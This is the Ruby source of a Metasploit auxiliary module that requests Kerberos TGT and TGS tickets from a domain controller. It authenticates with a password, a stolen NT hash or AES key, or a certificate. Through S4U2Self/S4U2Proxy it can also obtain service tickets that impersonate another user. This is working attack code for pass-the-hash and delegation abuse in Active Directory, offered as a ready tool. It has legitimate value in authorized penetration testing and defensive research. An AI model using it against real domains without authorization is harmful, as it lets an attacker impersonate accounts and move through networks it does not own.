##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Kerberos
  include Msf::Exploit::Remote::Kerberos::Client
  include Msf::Exploit::Remote::Kerberos::Ticket::Storage

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kerberos TGT/TGS Ticket Requester',
        'Description' => %q{
          This module requests TGT/TGS Kerberos tickets from the KDC
        },
        'Author' => [
          'Christophe De La Fuente', # Metasploit module
          'Spencer McIntyre', # Metasploit module
          # pkinit authors
          'Will Schroeder', # original idea/research
          'Lee Christensen', # original idea/research
          'Oliver Lyak', # certipy implementation
          'smashery' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'AKA' => ['getTGT', 'getST'],
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ],
          'Reliability' => [ ]
        },
        'Actions' => [
          [ 'GET_TGT', { 'Description' => 'Request a Ticket-Granting-Ticket (TGT)' } ],
          [ 'GET_TGS', { 'Description' => 'Request a Ticket-Granting-Service (TGS)' } ],
        ],
        'DefaultAction' => 'GET_TGT'
      )
    )

    register_options(
      [
        OptString.new('DOMAIN', [ false, 'The Fully Qualified Domain Name (FQDN). Ex: mydomain.local' ]),
        OptString.new('USERNAME', [ false, 'The domain user' ]),
        OptString.new('PASSWORD', [ false, 'The domain user\'s password' ]),
        OptPath.new('CERT_FILE', [ false, 'The PKCS12 (.pfx) certificate file to authenticate with' ]),
        OptString.new('CERT_PASSWORD', [ false, 'The certificate file\'s password' ]),
        OptString.new(
          'NTHASH', [
            false,
            'The NT hash in hex string. Server must support RC4'
          ]
        ),
        OptString.new(
          'AES_KEY', [
            false,
            'The AES key to use for Kerberos authentication in hex string. Supported keys: 128 or 256 bits'
          ]
        ),
        OptString.new(
          'SPN', [
            false,
            'The Service Principal Name, format is service_name/FQDN. Ex: cifs/dc01.mydomain.local'
          ],
          conditions: %w[ACTION == GET_TGS]
        ),
        OptString.new(
          'IMPERSONATE', [
            false,
            'The user on whose behalf a TGS is requested (it will use S4U2Self/S4U2Proxy to request the ticket)',
          ],
          conditions: %w[ACTION == GET_TGS]
        )
      ]
    )

    deregister_options('KrbCacheMode')
  end

  def validate_options
    if datastore['CERT_FILE'].present?
      certificate = File.read(datastore['CERT_FILE'])
      begin
        @pfx = OpenSSL::PKCS12.new(certificate, datastore['CERT_PASSWORD'] || '')
      rescue OpenSSL::PKCS12::PKCS12Error
        fail_with(Failure::BadConfig, 'Unable to parse certificate file, must be in PKCS#12 format')
      end

      if datastore['USERNAME'].blank? && datastore['DOMAIN'].present?
        fail_with(Failure::BadConfig, 'Domain override provided but no username override provided (must provide both or neither)')
      elsif datastore['DOMAIN'].blank? && datastore['USERNAME'].present?
        fail_with(Failure::BadConfig, 'Username override provided but no domain override provided (must provide both or neither)')
      end

      begin
        @username, @realm = extract_user_and_realm(@pfx.certificate, datastore['USERNAME'], datastore['DOMAIN'])
      rescue ArgumentError => e
        fail_with(Failure::BadConfig, e.message)
      end
    else # USERNAME and DOMAIN are required when they can't be extracted from the certificate
      @username = datastore['USERNAME']
      fail_with(Failure::BadConfig, 'USERNAME must be specified when used without a certificate') if @username.blank?

      @realm = datastore['DOMAIN']
      fail_with(Failure::BadConfig, 'DOMAIN must be specified when used without a certificate') if @realm.blank?
    end

    if datastore['NTHASH'].present? && !datastore['NTHASH'].match(/^\h{32}$/)
      fail_with(Msf::Exploit::Failure::BadConfig, 'NTHASH must be a hex string of 32 characters (128 bits)')
    end

    if datastore['AES_KEY'].present? && !datastore['AES_KEY'].match(/^(\h{32}|\h{64})$/)
      fail_with(Msf::Exploit::Failure::BadConfig,
                'AES_KEY must be a hex string of 32 characters for 128-bits AES keys or 64 characters for 256-bits AES keys')
    end

    if action.name == 'GET_TGS' && datastore['SPN'].blank?
      fail_with(Failure::BadConfig, 'SPN must be provided when requiring a TGS')
    end

    if datastore['SPN'].present? && !datastore['SPN'].match(%r{.+/.+})
      fail_with(Msf::Exploit::Failure::BadConfig, 'SPN format must be service_name/FQDN (ex: cifs/dc01.mydomain.local)')
    end
  end

  def run
    validate_options

    send("action_#{action.name.downcase}")

    report_service(
      host: rhost,
      port: rport,
      proto: 'tcp',
      name: 'kerberos',
      info: "Module: #{fullname}, KDC for domain #{@realm}"
    )
  rescue ::Rex::ConnectionError => e
    elog('Connection error', error: e)
    fail_with(Failure::Unreachable, e.message)
  rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError,
         ::EOFError => e
    msg = e.to_s
    if e.respond_to?(:error_code) &&
       e.error_code == ::Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_PREAUTH_REQUIRED
      msg << ' - Check the authentication-related options (PASSWORD, NTHASH or AES_KEY)'
    end
    fail_with(Failure::Unknown, msg)
  end

  def init_authenticator(options = {})
    options.merge!({
      host: rhost,
      realm: @realm,
      username: @username,
      pfx: @pfx,
      framework: framework,
      framework_module: self
    })
    options[:password] = datastore['PASSWORD'] if datastore['PASSWORD'].present?
    if datastore['NTHASH'].present?
      options[:key] = [datastore['NTHASH']].pack('H*')
      options[:offered_etypes] = [ Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC ]
    end
    if datastore['AES_KEY'].present?
      options[:key] = [ datastore['AES_KEY'] ].pack('H*')
      options[:offered_etypes] = if options[:key].size == 32
                                   [ Rex::Proto::Kerberos::Crypto::Encryption::AES256 ]
                                 else
                                   [ Rex::Proto::Kerberos::Crypto::Encryption::AES128 ]
                                 end
    end

    Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(**options)
  end

  def action_get_tgt
    print_status("#{peer} - Getting TGT for #{@username}@#{@realm}")

    # Never attempt to use the kerberos cache when requesting a kerberos TGT, to ensure a request is made
    authenticator = init_authenticator({ ticket_storage: kerberos_ticket_storage(read: false, write: true) })
    authenticator.request_tgt_only
  end

  def action_get_tgs
    authenticator = init_authenticator({ ticket_storage: kerberos_ticket_storage(read: true, write: true) })
    credential = authenticator.request_tgt_only(options)

    if datastore['IMPERSONATE'].present?
      print_status("#{peer} - Getting TGS impersonating #{datastore['IMPERSONATE']}@#{@realm} (SPN: #{datastore['SPN']})")

      sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
        name_type: Rex::Proto::Kerberos::Model::NameType::NT_UNKNOWN,
        name_string: [@username]
      )
      auth_options = {
        sname: sname,
        impersonate: datastore['IMPERSONATE']
      }
      tgs_ticket, _tgs_auth = authenticator.s4u2self(
        credential,
        auth_options.merge(ticket_storage: kerberos_ticket_storage(read: false, write: true))
      )

      auth_options[:sname] = Rex::Proto::Kerberos::Model::PrincipalName.new(
        name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
        name_string: datastore['SPN'].split('/')
      )
      auth_options[:tgs_ticket] = tgs_ticket
      authenticator.s4u2proxy(credential, auth_options)
    else
      print_status("#{peer} - Getting TGS for #{@username}@#{@realm} (SPN: #{datastore['SPN']})")

      sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
        name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
        name_string: datastore['SPN'].split('/')
      )
      tgs_options = {
        sname: sname,
        ticket_storage: kerberos_ticket_storage(read: false)
      }
      authenticator.request_tgs_only(credential, tgs_options)
    end
  end

end
